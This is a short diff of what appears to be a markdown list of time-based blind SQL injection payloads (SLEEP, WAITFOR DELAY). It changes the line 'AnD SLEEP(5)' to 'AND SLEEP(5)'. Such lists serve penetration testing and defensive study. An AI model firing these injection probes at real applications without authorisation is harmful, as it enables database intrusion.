@@ -108,7 +108,7 @@ WAITFOR DELAY '0:0:30'--
 sleep(4)
 1 or sleep(5)
 ORDER BY SLEEP(5)
-AnD SLEEP(5)
+AND SLEEP(5)
 waitfor delay '0:0:5'--
 ```
 
